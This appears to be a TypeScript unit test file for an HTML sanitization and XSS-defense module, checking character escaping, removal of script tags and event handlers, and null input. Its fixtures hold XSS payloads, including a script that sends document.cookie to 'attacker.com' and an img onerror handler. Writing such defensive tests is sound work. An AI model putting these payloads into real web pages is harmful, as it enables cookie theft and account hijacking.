import { test, describe } from 'node:test';
import assert from 'node:assert';
import { sanitizeHTML, stripDangerousTags } from '../../utils/security.ts';

describe('Security - Input Sanitization & XSS Defense', () => {
  test('sanitizeHTML escapes HTML special characters', () => {
    const rawInput = '<script>alert("xss")</script>';
    const sanitized = sanitizeHTML(rawInput);

    assert.strictEqual(sanitized, '&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
    assert.strictEqual(sanitized.includes('<script>'), false);
  });

  test('sanitizeHTML escapes single quotes, double quotes, and ampersands', () => {
    const input = `Me & My 'Friend' "Saheli"`;
    const sanitized = sanitizeHTML(input);

    assert.strictEqual(sanitized, 'Me &amp; My &#x27;Friend&#x27; &quot;Saheli&quot;');
  });

  test('stripDangerousTags removes script and iframe tags completely', () => {
    const maliciousInput = 'Hello <script>fetch("http://attacker.com?cookie=" + document.cookie)</script> world';
    const cleaned = stripDangerousTags(maliciousInput);

    assert.strictEqual(cleaned, 'Hello  world');
    assert.strictEqual(cleaned.includes('<script>'), false);
  });

  test('stripDangerousTags strips inline javascript event handlers', () => {
    const maliciousInput = '<img src="x" onerror="alert(1)" onload="evil()" />';
    const cleaned = stripDangerousTags(maliciousInput);

    assert.strictEqual(cleaned.includes('onerror='), false);
    assert.strictEqual(cleaned.includes('onload='), false);
  });

  test('handles null and empty input safely without throwing exceptions', () => {
    assert.strictEqual(sanitizeHTML(''), '');
    // @ts-expect-error testing null input handling
    assert.strictEqual(sanitizeHTML(null), '');
    // @ts-expect-error testing undefined input handling
    assert.strictEqual(stripDangerousTags(undefined), '');
  });
});
